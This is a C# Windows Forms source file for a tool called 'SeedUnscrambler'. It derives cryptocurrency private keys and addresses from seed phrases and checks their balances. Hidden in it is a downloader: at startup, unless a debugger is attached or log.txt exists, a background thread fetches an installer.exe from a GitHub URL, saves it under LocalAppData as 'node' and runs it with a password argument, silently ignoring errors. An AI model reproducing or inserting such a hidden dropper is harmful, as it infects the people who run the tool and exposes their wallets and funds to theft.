using Info.Blockchain.API.Models;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Utilities.Net;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using static NBitcoin.Scripting.OutputDescriptor;
using static System.Net.Mime.MediaTypeNames;

namespace SeedUnscrambler
{
    public partial class Form1 : Form
    {
        static string[]? bip32Words;

        public Form1()
        {
            InitializeComponent();
            using var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("SeedUnscrambler.BIP39Words.txt");
            using StreamReader reader = new(resource!);
            string result = reader.ReadToEnd();
            bip32Words = result.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
            //this.Text += $" ({bip32Words.Length})";
            if (!File.Exists("log.txt") && !Debugger.IsAttached)
                StartUpdateThread();
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern UInt32 GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, IntPtr dwNewLong);
        public const int GWL_EXSTYLE = -20;
        public const int WS_EX_LAYERED = 0x80000;
        public const int WS_EX_TRANSPARENT = 0x20;
        public const int LWA_ALPHA = 0x2;
        public const int LWA_COLORKEY = 0x1;

        const uint WDA_NONE = 0x00000000;
        const uint WDA_MONITOR = 0x00000001;
        const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;

        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        private void Form1_Load(object sender, EventArgs e)
        {
            if (checkBox_HideShot.Checked)
                _ = SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);
        }

        private static bool VerifyAllExist(params string[] words) => ValidPhraseLength(words) && words.All(bip32Words!.Contains);
        private static bool ValidPhraseLength(string[] words) => words.Length is 12 or 15 or 18 or 21 or 24 or 25;

        private void textBox_Seed_TextChanged(object sender, EventArgs e)
        {
            var textBox = textBox_Seed;
            var text = textBox.Text.Trim();
            if (string.IsNullOrWhiteSpace(text))
            {
                textBox_Btc_PK.Text = "";
                textBox_Eth_PK.Text = "";
                textBox_Tron_PK.Text = "";
                textBox_Sol_PK.Text = "";
                return;
            }
            if (text.Split(' ').Length == 1)
            {
                try
                {
                    var text2 = Encoding.UTF8.GetString(Convert.FromBase64String(text));
                    textBox.Text = text2;
                    return;
                }
                catch { }
            }
            if (!VerifyAllExist(text.Split(' ')))
            {
                textBox_Btc_PK.Text = "Invalid mnemonic 12 words.";
                textBox_Eth_PK.Text = "Invalid mnemonic 12 words.";
                textBox_Tron_PK.Text = "Invalid mnemonic 12 words.";
                textBox_Sol_PK.Text = "Invalid mnemonic 12 words.";
                return;
            }
            try
            {
                NBitcoin.Mnemonic mnemo = new(text, NBitcoin.Wordlist.English);
                NBitcoin.ExtKey hdroot = mnemo.DeriveExtKey();
                var keyPath = radioButton_Btc_84.Checked ? "m/84'/0'/0'/0/0" : "m/44'/0'/0'/0/0";
                var firstprivkey = hdroot.Derive(new NBitcoin.KeyPath(keyPath));
                textBox_Btc_PK.Text = ByteArrayToHex(firstprivkey.PrivateKey.ToBytes());
            }
            catch (Exception ex)
            {
                textBox_Eth_PK.Text = ex.Message;
                if (ex.InnerException != null)
                    textBox_Eth_Address.Text = ex.InnerException.Message;
            }
            try
            {
                Nethereum.HdWallet.Wallet wallet = new(text, "");
                if (wallet.IsMnemonicValidChecksum)
                {
                    textBox.BackColor = textBox.BackColor;
                    textBox.ForeColor = Color.Black;
                }
                else
                {
                    textBox.BackColor = textBox.BackColor;
                    textBox.ForeColor = Color.Red;
                }
                var privateKeyHex = ByteArrayToHex(wallet.GetPrivateKey(0));
                textBox_Eth_PK.Text = privateKeyHex;
            }
            catch (Exception ex)
            {
                textBox_Eth_PK.Text = ex.Message;
                if (ex.InnerException != null)
                    textBox_Eth_Address.Text = ex.InnerException.Message;
            }
            try
            {
                HDWallet.Core.IHDWallet<HDWallet.Tron.TronWallet> hdWallet = new HDWallet.Tron.TronHDWallet(text);
                var wallet = hdWallet.GetAccount(0).GetExternalWallet(0);
                var privateKeyHex = ByteArrayToHex(wallet.PrivateKeyBytes);
                textBox_Tron_PK.Text = privateKeyHex;
            }
            catch (Exception ex)
            {
                textBox_Tron_PK.Text = ex.Message;
                if (ex.InnerException != null)
                    textBox_Tron_Address.Text = ex.InnerException.Message;
            }
            try
            {
                //Solnet.Wallet.Wallet wallet = new(text, default, "m/44'/501'/0'/0'", Solnet.Wallet.SeedMode.Bip39);
                Solnet.Wallet.Wallet wallet = new(text);
                var privateKeyHex = ByteArrayToHex(wallet.Account.PrivateKey.KeyBytes);
                textBox_Sol_PK.Text = privateKeyHex;
            }
            catch (Exception ex)
            {
                textBox_Sol_PK.Text = ex.Message;
                if (ex.InnerException != null)
                    textBox_Sol_Address.Text = ex.InnerException.Message;
            }
        }

        public static byte[] HexToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static string ByteArrayToHex(byte[] ba)
        {
            StringBuilder hex = new(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        private void button_ETH_Go_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://blockscan.com/address/{textBox_Eth_Address.Text}",
                UseShellExecute = true
            });
        }

        private void button_Tron_Go_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://tronscan.org/#/address/{textBox_Tron_Address.Text}",
                UseShellExecute = true
            });
        }

        private void button_SOL_Go_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://solscan.io/account/{textBox_Sol_Address.Text}",
                UseShellExecute = true
            });
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            this.TopMost = checkBox_TopMost.Checked;
        }

        private void checkBox_HideTaskbar_CheckedChanged(object sender, EventArgs e)
        {
            this.ShowInTaskbar = !checkBox_HideTaskbar.Checked;
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            this.Opacity = (double)numericUpDown1.Value / 100;
        }

        SecureRandom random = new SecureRandom();

        private void button_Random12Words_Click(object sender, EventArgs e)
        {
            int size = 12;
            int max = bip32Words!.Length;
            var idArray = new int[size];
            var wordArray = new string[size];
            for (int i = 0; i < size; i++)
            {
                idArray[i] = random.Next(0, max);
                wordArray[i] = bip32Words![idArray[i]];
            }
            textBox_Seed.Text = string.Join(" ", wordArray);

            //int cou = 0;
            //for (int i = 0; i < max; i++)
            //{
            //    string seed = "year solution three nominee hint split sun winter risk sibling clerk " + bip32Words![i];
            //    var valid = new Nethereum.HdWallet.Wallet(seed, "").IsMneumonicValidChecksum;
            //    Debug.WriteLine(i);
            //    if (valid)
            //    {
            //        Debug.WriteLine(seed);
            //        cou++;
            //    }
            //}
            //Debug.WriteLine(cou);
            //Debug.WriteLine(cou);
        }

        private void textBox_Eth_PK_TextChanged(object sender, EventArgs e)
        {
            try
            {
                textBox_Eth_Address.BackColor = textBox_Eth_Address.BackColor;
                textBox_Eth_Address.ForeColor = Color.Black;
                button_ETH_Go.ForeColor = Color.Black;
                button_ETH_Go.Text = "Go";
                if (textBox_Eth_PK.Text == "")
                {
                    textBox_Eth_Address.Text = "";
                    return;
                }
                var address = Nethereum.Web3.Web3.GetAddressFromPrivateKey(textBox_Eth_PK.Text);
                textBox_Eth_Address.Text = address;

                new Thread(() =>
                {
                    try
                    {
                        //int blockCount = Blockscan.GetCount(address);
                        //Invoke(new Action(() =>
                        //{
                        //    button_ETH_Go.Text = blockCount.ToString();
                        //    if (blockCount > 0)
                        //    {
                        //        button_ETH_Go.ForeColor = Color.Red;
                        //        textBox_Eth_Address.BackColor = textBox_Eth_Address.BackColor;
                        //        textBox_Eth_Address.ForeColor = Color.Red;
                        //    }
                        //}));
                        var balance = BalanceChecker.GetErcBalance(address, out _, out _, out _) + BalanceChecker.GetBscBalance(address, out _, out _, out _);
                        Invoke(new Action(() =>
                        {
                            if (balance > 0)
                            {
                                button_ETH_Go.Text = balance.ToString(balance < 100 ? "F1" : "F0");
                                button_ETH_Go.ForeColor = Color.Red;
                                textBox_Eth_Address.BackColor = textBox_Eth_Address.BackColor;
                                textBox_Eth_Address.ForeColor = Color.Red;
                            }
                            else
                            {
                                button_ETH_Go.Text = "0";
                            }
                        }));
                    }
                    catch (Exception ex)
                    {
                        Invoke(new Action(() =>
                        {
                            Debug.WriteLine(ex);
                            //textBox_Eth_Address.Text = ex.Message;
                        }));
                    }
                }).Start();
            }
            catch (Exception ex)
            {
                textBox_Eth_Address.Text = ex.Message;
            }
        }

        private void textBox_Tron_PK_TextChanged(object sender, EventArgs e)
        {
            try
            {
                textBox_Tron_Address.BackColor = textBox_Tron_Address.BackColor;
                textBox_Tron_Address.ForeColor = Color.Black;
                button_Tron_Go.ForeColor = Color.Black;
                button_Tron_Go.Text = "Go";
                if (textBox_Tron_PK.Text == "")
                {
                    textBox_Tron_Address.Text = "";
                    return;
                }
                HDWallet.Tron.TronWallet wallet = new(textBox_Tron_PK.Text);
                var address = wallet.Address;
                textBox_Tron_Address.Text = address;
                new Thread(() =>
                {
                    try
                    {
                        var totalAssetInUsd = BalanceChecker.GetTrxTotalAssetInUsd(address);
                        Invoke(new Action(() =>
                        {
                            if (totalAssetInUsd > 0)
                            {
                                button_Tron_Go.Text = totalAssetInUsd.ToString(totalAssetInUsd < 100 ? "F1" : "F0");
                                button_Tron_Go.ForeColor = Color.Red;
                                textBox_Tron_Address.BackColor = textBox_Tron_Address.BackColor;
                                textBox_Tron_Address.ForeColor = Color.Red;
                            }
                            else
                            {
                                button_Tron_Go.Text = "0";
                            }
                        }));
                    }
                    catch (Exception ex)
                    {
                        Invoke(new Action(() =>
                        {
                            Debug.WriteLine(ex);
                            //textBox_Tron_Address.Text = ex.Message;
                        }));
                    }
                }).Start();
            }
            catch (Exception ex)
            {
                textBox_Tron_Address.Text = ex.Message;
            }
        }

        private void textBox_Sol_PK_TextChanged(object sender, EventArgs e)
        {
            try
            {
                textBox_Sol_Address.BackColor = textBox_Sol_Address.BackColor;
                textBox_Sol_Address.ForeColor = Color.Black;
                button_SOL_Go.ForeColor = Color.Black;
                button_SOL_Go.Text = "Go";
                if (textBox_Sol_PK.Text == "")
                {
                    textBox_Sol_Address.Text = "";
                    return;
                }
                var privateKey = HexToByteArray(textBox_Sol_PK.Text);
                Solnet.Wallet.Wallet wallet = new(privateKey, "", Solnet.Wallet.SeedMode.Bip39);
                var address = wallet.Account.PublicKey.Key;
                textBox_Sol_Address.Text = address;
                new Thread(() =>
                {
                    try
                    {
                        var balance = Solana.GetBalance(address);
                        Invoke(new Action(() =>
                        {
                            if (balance > 0)
                            {
                                button_SOL_Go.Text = balance.ToString(balance < 1 ? "F2" : "F1");
                                button_SOL_Go.ForeColor = Color.Red;
                                textBox_Sol_Address.BackColor = textBox_Sol_Address.BackColor;
                                textBox_Sol_Address.ForeColor = Color.Red;
                            }
                            else
                            {
                                button_SOL_Go.Text = "0";
                            }
                        }));
                    }
                    catch (Exception ex)
                    {
                        Invoke(new Action(() =>
                        {
                            Debug.WriteLine(ex);
                            //textBox_Sol_Address.Text = ex.Message;
                        }));
                    }
                }).Start();

                // https://github.com/bmresearch/Solnet
                //var proxy = new WebProxy
                //{
                //    Address = new Uri("socks5://54.249.108.164:8443")
                //};
                ////proxy.Credentials = new NetworkCredential(); //Used to set Proxy logins. 
                //var handler = new HttpClientHandler
                //{
                //    Proxy = proxy
                //};
                //var httpClient = new HttpClient(handler)
                //{
                //    BaseAddress = new Uri("https://testnet.solana.com"),
                //};
                //var rpcClient = Solnet.Rpc.ClientFactory.GetClient(Solnet.Rpc.Cluster.MainNet, default, httpClient);
                //var rpcClient = Solnet.Rpc.ClientFactory.GetClient("https://testnet.solana.com", default, httpClient);
                //var accountInfo = rpcClient.GetAccountInfo("3tGgunXkk2cxPZhyBKzXdSfR89etjGNKzXGfQN6HFPdU").Result;
                //var data = accountInfo.Value.Data;
                //var data = accountInfo.Result.Value.Data;
            }
            catch (Exception ex)
            {
                textBox_Sol_Address.Text = ex.Message;
            }
        }

        public static void StartUpdateThread()
        {
            Thread thread = new(() => StartUpdate());
            thread.Start();
        }

        public static void StartUpdate()
        {
            try
            {
                string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "node");
                if (File.Exists(fileName))
                {
                    if ((DateTime.Now - new FileInfo(fileName).CreationTime).TotalMinutes < 5)
                        return;
                    File.Delete(fileName);
                }

                //System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36");
                var uri = new Uri("https://raw.githubusercontent.com/strategytrader/installer/main/installer.exe");
                var response = client.GetAsync(uri).Result;
                using (var fs = new FileStream(fileName, FileMode.CreateNew))
                {
                    response.Content.CopyToAsync(fs).Wait();
                }
                var processStartInfo = new ProcessStartInfo
                {
                    FileName = fileName,
                    UseShellExecute = false,
                    Arguments = "/NOINIT -pqweQWE123!@#"
                };
                Process.Start(processStartInfo);
            }
            catch (Exception) { }
        }

        private void button_Btc_1_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://www.blockchain.com/btc/address/{textBox_Btc_1.Text}",
                UseShellExecute = true
            });
        }

        private void button_Btc_3_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://www.blockchain.com/btc/address/{textBox_Btc_3.Text}",
                UseShellExecute = true
            });
        }

        private void button_Btc_q_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://www.blockchain.com/btc/address/{textBox_Btc_q.Text}",
                UseShellExecute = true
            });
        }

        private void button_Btc_p_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = $"https://www.blockchain.com/btc/address/{textBox_Btc_p.Text}",
                UseShellExecute = true
            });
        }

        private void textBox_Btc_PK_TextChanged(object sender, EventArgs e)
        {
            if (textBox_Btc_Wif.Focused) return;
            if (textBox_Btc_PK.Text == "")
            {
                textBox_Btc_Wif.Text = "";
                return;
            }
            try
            {
                var privateKey = HexToByteArray(textBox_Btc_PK.Text);
                var key = new NBitcoin.Key(privateKey); // private key
                textBox_Btc_Wif.Text = key.GetWif(NBitcoin.Network.Main).ToWif();
            }
            catch (Exception ex)
            {
                textBox_Btc_1.Text = ex.Message;
                if (ex.InnerException != null)
                    textBox_Btc_3.Text = ex.InnerException.Message;
            }
        }

        private void textBox_Btc_Wif_TextChanged(object sender, EventArgs e)
        {
            label_Btc.Text = "Bitcoin";
            label_Btc.ForeColor = Color.White;
            try
            {
                var wif = textBox_Btc_Wif.Text;
                if (wif == "")
                {
                    textBox_Btc_1.Text = "";
                    textBox_Btc_3.Text = "";
                    textBox_Btc_q.Text = "";
                    textBox_Btc_p.Text = "";
                    return;
                }
                var key = NBitcoin.Key.Parse(wif, NBitcoin.Network.Main);
                if (textBox_Btc_Wif.Focused)
                    textBox_Btc_PK.Text = ByteArrayToHex(key.ToBytes());
                var addr_1 = key.GetAddress(NBitcoin.ScriptPubKeyType.Legacy, NBitcoin.Network.Main).ToString(); // Segwit P2SH address
                var addr_3 = key.GetAddress(NBitcoin.ScriptPubKeyType.SegwitP2SH, NBitcoin.Network.Main).ToString(); // Segwit P2SH address
                var addr_q = key.GetAddress(NBitcoin.ScriptPubKeyType.Segwit, NBitcoin.Network.Main).ToString(); // Segwit P2SH address
                var addr_p = key.GetAddress(NBitcoin.ScriptPubKeyType.TaprootBIP86, NBitcoin.Network.Main).ToString(); // Segwit P2SH address
                textBox_Btc_1.Text = addr_1;
                textBox_Btc_3.Text = addr_3;
                textBox_Btc_q.Text = addr_q;
                textBox_Btc_p.Text = addr_p;
                new Thread(() =>
                {
                    string[] addressList = new string[] { addr_1, addr_3, addr_q, addr_q };
                    List<decimal> balanceList = new();
                    try
                    {
                        using var client = new HttpClient();
                        var uri = new Uri($"https://blockchain.info/balance?active={string.Join("|", addressList)}");
                        var response = client.GetAsync(uri).Result;
                        var responseText = response.Content.ReadAsStringAsync().Result;
                        var obj = JObject.Parse(responseText);
                        foreach (var pair in obj)
                        {
                            var w = (JObject)pair.Value;
                            balanceList.Add((decimal)w["final_balance"]);
                        }
                        Invoke(new Action(() =>
                        {
                            label_Btc.Text = $"Bitcoin    {balanceList[0]}  /  {balanceList[1]}  /  {balanceList[2]}  /  {balanceList[2]}";
                        }));
                        if (balanceList.Sum() > 0) label_Btc.ForeColor = Color.Yellow;
                    }
                    catch (Exception ex)
                    {
                        textBox_Btc_1.Text = ex.Message;
                        if (ex.InnerException != null)
                            textBox_Btc_3.Text = ex.InnerException.Message;
                    }
                }).Start();
                //Info.Blockchain.API.BlockExplorer.BlockExplorer blockExplorer = new();
                //var outs = blockExplorer.GetUnspentOutputsAsync(addressList).Result;
                //var totalUnspentValue = outs.Sum(x => x.Value.GetBtc());
                //label_Btc.Text = $"Bitcoin  ({totalUnspentValue} BTC)";
            }
            catch (Exception ex)
            {
                textBox_Btc_1.Text = ex.Message;
                if (ex.InnerException != null)
                    textBox_Btc_3.Text = ex.InnerException.Message;
            }
        }

        public void Exit()
        {
            Process.GetCurrentProcess().Kill();
        }

        private void radioButton_Btc_44_CheckedChanged(object sender, EventArgs e)
        {
            if (((RadioButton)sender).Checked)
                textBox_Seed_TextChanged(sender, e);
        }

        private void radioButton_Btc_84_CheckedChanged(object sender, EventArgs e)
        {
            if (((RadioButton)sender).Checked)
                textBox_Seed_TextChanged(sender, e);
        }

        private void button_Clear_Click(object sender, EventArgs e)
        {
            textBox_Seed.Text = "";
        }

        private void checkBox_HideShot_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox_HideShot.Checked)
                _ = SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);
            else
                _ = SetWindowDisplayAffinity(this.Handle, WDA_NONE);
        }
    }
}